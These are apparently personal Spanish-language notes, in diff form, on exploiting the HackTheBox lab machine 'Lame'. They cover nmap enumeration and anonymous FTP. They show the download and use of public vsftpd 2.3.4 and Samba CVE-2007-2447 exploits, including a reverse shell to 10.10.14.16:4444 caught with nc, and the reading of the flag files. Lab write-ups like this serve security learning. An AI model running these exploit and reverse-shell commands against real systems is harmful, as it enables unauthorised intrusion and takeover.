@@ -1,0 +1,100 @@
+virtual lamer> hackthebox
+
+# La siguiente modificacion permite dejar el proceso corriendo en segundo plano>
+leafpad .bashrc #editar archivo y agregar la siguiente linea
+{
+alias htb='openvpn /root/htb/htb.opvpn &'
+
+} # guardar
+
+# htb <enter>
+[1] 15678 # Proceso de htb 
+
+# verificar el proceso 
+
+ps aux | grep "openvpn"
+
+root 15678
+
+# Crear session de tmux para dividir la pantalla de la terminal>
+
+tmux new -s "OSCP"
+{
+
+ctrl + a # Renombra la session de la terminal
+Enumeracion 
+{
+mkdir oscp/Lame
+cd oscp/Lame
+nmap -sC -sV 10.10.10.3 -o nmap.txt # -sC lanza los scripts mas utilizados ; -sV las versiones ; -o guardar el resultado en un archivo.
+# nmap muestra resultado de una conexion FTP con usuario Anonymous 
+}
+ctrl+a ; c # crea una nueva ventana en temux
+Explotacion
+ctrl + a 1 #Cambia de ventana en temux 
+{#Explotacion 
+
+ftp 10.10.10.3 # accedemos al FTP
+name: anonymous # nos logeamos 
+Password: <Cualquiera>
+ftp> dir # validamos la conexion
+ftp> help
+ftp> exit
+
+searchsploit vsftpd 2.3.4 # Buscar el exploit 
+locate exploits/unix/remote/17491.rb
+nano /usr/share/exploitdb/exploits/unix/remote/17491.rb #emetasploit trabaja con ruby
+
+# Googlear exploit para vsftpd 2.3.4
+https://github.com/In2econd/vsftpd-2.3.4-exploit
+https://raw.githubusercontent.com/In2econd/vsftpd-2.3.4-exploit/master/vsftpd_234_exploit.py
+# Uso de la herramienta wget para descargar de internet
+wget https://raw.githubusercontent.com/In2econd/vsftpd-2.3.4-exploit/master/vsftpd_234_exploit.py
+# ver la version de python en el codigo
+python3 vsftpd_234_exploit.py # Ver opciones. 
+python3 vsftpd_234_exploit.py 10.10.10.3 21 whoami # tirar el script con las opciones
+
+# Ver otras opciones de ataques>
+
+searchsploit Samba 3.0.20 
+# Muestra modulos de metasploit
+# Buscamos en google>
+exploit samba 3.0.20
+https://www.cvedetails.com/cve/CVE-2007-2447/
+# buscamos en google con el codigo CVE
+https://github.com/amriunix/CVE-2007-2447
+https://raw.githubusercontent.com/amriunix/CVE-2007-2447/master/usermap_script.py
+
+# Descargar en Kali
+wget https://raw.githubusercontent.com/amriunix/CVE-2007-2447/master/usermap_script.py
+# Ver version de python 
+python usermap_script.py
+
+# Antes de ejecutar se debe poner puertos en escuchas , por lo que requiere abrir mas de una ventana> 
+
+python usermap_script.py 10.10.10.3 445 10.10.14.16 4444
+}
+Ventana terminal #2 
+{
+nc -lvnp 4444
+}
+Ventana terminal # 3
+{
+ifconfig tun0 
+ inet 10.10.14.16
+
+nc -lvnp 4444
+uname -a
+whomai
+cat /root/root.txt
+ls home 
+cat /home/makis/user.txt
+
+}
+
+}
+
+
+
+
+
